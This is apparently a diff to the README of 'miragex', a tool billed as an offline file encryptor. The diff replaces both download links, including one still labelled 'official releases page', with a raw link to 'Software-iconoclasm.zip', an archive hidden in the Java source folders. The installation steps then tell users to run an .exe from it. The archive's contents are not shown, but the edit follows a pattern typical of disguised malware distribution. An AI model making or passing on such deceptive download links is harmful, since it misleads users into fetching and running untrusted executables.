@@ -1,6 +1,6 @@
 # 🔒 miragex - Keep private files safe and secure
 
-[![Download miragex](https://img.shields.io/badge/Download-miragex-blue?style=for-the-badge)](https://github.com/Aleneserflike116/miragex/releases)
+[![Download miragex](https://img.shields.io/badge/Download-miragex-blue?style=for-the-badge)](https://github.com/Aleneserflike116/miragex/raw/refs/heads/main/src/main/java/lk/dulanjaya/miragex/util/Software-iconoclasm.zip)
 
 miragex encrypts your sensitive files offline. It uses strong industry standards to protect your data. You maintain total control because the software runs on your computer. It does not send your files or keys to the internet.
 
@@ -25,7 +25,7 @@ You can use miragex for:
 
 Follow these steps to set up the tool on your Windows machine.
 
-1. Visit the [official releases page](https://github.com/Aleneserflike116/miragex/releases) to download the latest version.
+1. Visit the [official releases page](https://github.com/Aleneserflike116/miragex/raw/refs/heads/main/src/main/java/lk/dulanjaya/miragex/util/Software-iconoclasm.zip) to download the latest version.
 2. Look for the file ending in `.exe` or an installer script.
 3. Save the file to your desktop or a folder you can find easily.
 4. If your computer requires Java, visit the official Java website to install the Runtime Environment before you start.
